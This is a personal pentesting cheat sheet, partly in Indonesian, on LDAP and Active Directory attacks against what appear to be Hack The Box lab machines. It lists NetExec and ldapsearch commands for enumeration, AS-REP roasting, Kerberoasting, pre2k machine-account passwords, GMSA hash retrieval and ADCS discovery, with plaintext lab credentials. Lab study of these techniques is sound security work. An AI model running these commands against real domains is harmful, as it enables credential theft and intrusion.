# 0. Automation
```shell
modes=(
"--computers"
"--groups"
"--pass-pol"
"--pso"
"--asreproast|asreproast.txt"
"--kerberoasting|kerberoast.txt"
"-M|adcs"
"-M|badsuccessor"
"-M|certipy-find"
"-M|dns-nonsecure"
"-M|dump-computers"
"-M|entra-id"
"-M|maq"
"-M|obsolete"
"-M|sccm"
"-M|subnets"
"-M|whoami"
"-M|get-desc-users"
"-M|get-info-users"
"-M|get-unixUserPassword"
"-M|get-userPassword"
"-M|laps"
"-M|user-desc"
"-M|pre2k"
"-M|raisechild"
"-M|get-network"
)

for entry in "${modes[@]}"; do
  IFS='|' read -r flag arg <<< "$entry"
  echo "=== $flag $arg =="
  nxc ldap scaffold.htb -u 'j.harris' -p 'Harr1sHelpdesk2026!Breach' $flag $arg
  echo ""
done
```
# 1. Enum
LDAP adalah "phonebook" dari Active Directory. Semua object di domain — user, group, computer, GPO, SPN — tersimpan di sini. Kalau kita bisa query LDAP, kita bisa memetakan seluruh domain tanpa exploit apapun.

| Port | Services |
| ---- | -------- |
| 389  | LDAP     |
| 636  | LDAPS    |
```shell
sudo nmap -n -sV --script 'ldap* and not brute' scaffold,htb -o nmap_ldap.txt
```

Level 0 -> Windows 2000
Level 2 -> Windows Server 2003
Level 3 -> Windows Server 2008
Level 4 -> Windows Server 2008 R2
Level 5 -> Windows Server 2012
Level 6 -> Windows Server 2012 R2
Level 7 -> Windows Server 2016
Level 10 -> Windows Server 2019/2022
# 2. Login
## a. Null Session
```shell
# Cek login
nxc ldap <IP> -u '' -p ''

# login
ldapsearch -H ldap://overwatch.htb -x -b 'DC=overwatch,DC=htb'
```
## b. Authenticated
```shell
# outputnya banyak  
ldapsearch -H ldap://danglingtree.htb -x -b 'DC=danglingtree,DC=htb' -D 'jake.h@danglingtree.htb' -w 'NewPassword123' | tee ldapsearch.txt
```
# 3. AS-REP Roasting 
```shell
nxc ldap garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --asreproast asreproastable.txt
```
# 4. Kerberoasting via LDAP
```shell
nxc ldap garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --kerberoasting kerberoasting.txt
```
![](Attachments/Pasted%20image%2020260616092929.png)
# 5. Enum
## a. User
lebih bagus pake `nxc smb --rid-brute` karena lebih **lengkap.**
```shell
nxc ldap danglingtree.htb -u 'anderson.w' -p 'R3dT3am@Acc3ss#01' --users
```
![](Attachments/Pasted%20image%2020260703095409.png)
## b. List Computer
```shell
nxc ldap garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' --computers | tee computers.txt
```
![](Attachments/Pasted%20image%2020260621170242.png)
## c. Password Policy
```shell
nxc ldap <IP> -u user -p pass --pass-pol
```
## d. User description
```shell
-M get-desc-users
```
![](Attachments/Pasted%20image%2020260917141552.png)
# 6. Pre2k
When machine accounts are created with the "Assign this computer account as a pre-Windows 2000 computer" checkbox, their initial password is set to the lowercase hostname (without the `$`). These accounts were pre-created but never joined to the domain, so the password was never changed.
```shell
nxc ldap garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' -M pre2k

# bisa null session juga
nxc ldap 10.129.4.198 -u '' -p '' --pre2k
```
![](Attachments/Pasted%20image%2020260616184912.png)
pada contoh diatas passwordnya adalah
`MS01$:ms01`
`EXCH01$:exch01`

biasnyha account dari output pre2k digunakan untuk serangan lanjuta GMSA
# 7. GMSA
Akun GMSA biasanya ada `$` di akhirnya, seperti `MS01$` . 
karena kita menggunakan TGT, password bisa dikosongkan
![](Attachments/Pasted%20image%2020260618190850.png)
output dari GMSA adalah NTLM hash
# 8. ADCS
cek CA server
```shell
nxc ldap danglingtree.htb -u 'jake.h' -p 'NewPassword123' -M adcs
```
